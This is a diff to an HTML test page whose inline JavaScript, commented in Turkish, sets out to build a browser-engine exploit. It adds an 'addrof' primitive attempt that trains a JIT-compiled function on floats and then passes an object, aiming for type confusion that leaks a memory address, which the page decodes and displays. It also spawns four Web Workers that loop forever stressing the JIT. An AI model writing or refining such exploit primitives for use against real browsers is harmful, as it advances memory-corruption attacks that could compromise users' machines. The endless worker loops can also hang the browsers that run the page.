@@ -2,41 +2,44 @@
 <html><body>
 <h1 id="s">Running...</h1>
 <script>
-// Hafızayı ölçerek crash noktasını bul
-var log = [];
+var corrupt = false;
+
+// addrof primitive attempt
+function addrof(val) {
+  var o = {x: val};
+  // JIT'i float olarak compile ettir
+  function leak(o) { return o.x; }
+  for(var i = 0; i < 100000; i++) leak({x: 1.1});
+  // Sonra object geçir — type mismatch
+  return leak(o);
+}
 
 var wCode = `
-  function f(o) { return o.x + o.y; }
-  for(var i=0;i<200000;i++) f({x:1.1,y:2.2});
-  while(true) {
-    f({x:1,y:2});
-    f({x:"a",y:"b"});
-    f({x:1.1,y:2.2});
+  function jit(o){return o.a+o.b;}
+  for(var i=0;i<300000;i++) jit({a:1.1,b:2.2});
+  while(true){
+    jit({a:1.1,b:2.2});
+    jit({a:1,b:2});
+    jit({a:"x",b:"y"});
   }
 `;
-var u = URL.createObjectURL(
-  new Blob([wCode],{type:'text/javascript'})
-);
+var u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
 for(var i=0;i<4;i++) new Worker(u);
 
-function f(o){return o.x+o.y;}
-for(var i=0;i<200000;i++) f({x:1.1,y:2.2});
-
-var n=0;
-function run(){
-  try {
-    for(var i=0;i<10000;i++){
-      f({x:1,y:2});
-      f({x:"str",y:"str"});
-      f({x:{},y:{}});
-    }
-    n++;
-    document.getElementById('s').textContent='iter:'+n;
-    setTimeout(run,0);
-  } catch(e) {
-    document.getElementById('s').textContent='EXCEPTION: '+e;
-  }
+// Primitive test
+var target = {secret: 0xdeadbeef};
+try {
+  var leaked = addrof(target);
+  var buf = new ArrayBuffer(8);
+  var view = new DataView(buf);
+  view.setFloat64(0, leaked, true);
+  var lo = view.getUint32(0, true);
+  var hi = view.getUint32(4, true);
+  document.getElementById('s').textContent = 
+    'leaked: 0x' + hi.toString(16) + lo.toString(16);
+  corrupt = true;
+} catch(e) {
+  document.getElementById('s').textContent = 'no primitive: ' + e;
 }
-run();
 </script>
 </body></html>
